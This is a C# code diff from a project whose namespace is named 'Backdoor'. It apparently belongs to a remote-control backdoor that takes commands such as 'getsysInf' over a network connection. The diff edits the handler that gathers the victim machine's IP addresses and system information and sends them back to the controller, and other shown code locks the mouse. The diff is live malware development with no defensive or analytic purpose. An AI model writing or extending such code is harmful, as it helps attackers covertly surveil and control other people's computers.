@@ -255,17 +255,16 @@ namespace Backdoor
                     }
                     if (data.StartsWith("getsysInf"))
                     {
-                        data = data.Remove(0, 11);
+                        data = data.Remove(0, 10);
                         string comm = ParseComand(data);
                         if (comm.StartsWith("true"))
                         {
-                            comm = comm.Remove(0, 5);
-                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
+                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation(true)));
                             continue;
                         }
                         if (comm.StartsWith("false"))
                         {
-                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
+                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation(true)));
                             continue;
                         }
                         else
@@ -527,10 +526,11 @@ namespace Backdoor
             }
             LockMouse();
         }
-        public string GetSystemInformation()
+        public string GetSystemInformation(bool getip = false)
         {
             string str = "нету ip";
-            for (int i = 0; i < Dns.GetHostByName(Dns.GetHostName()).AddressList.Length; i++) str += Dns.GetHostByName(Dns.GetHostName()).AddressList[i];
+            if(getip)
+                for (int i = 0; i < Dns.GetHostByName(Dns.GetHostName()).AddressList.Length; i++) str += ", " + Dns.GetHostByName(Dns.GetHostName()).AddressList[i];
             return 
 $@"<sysInf> 
 <ip>{str}</ip> 
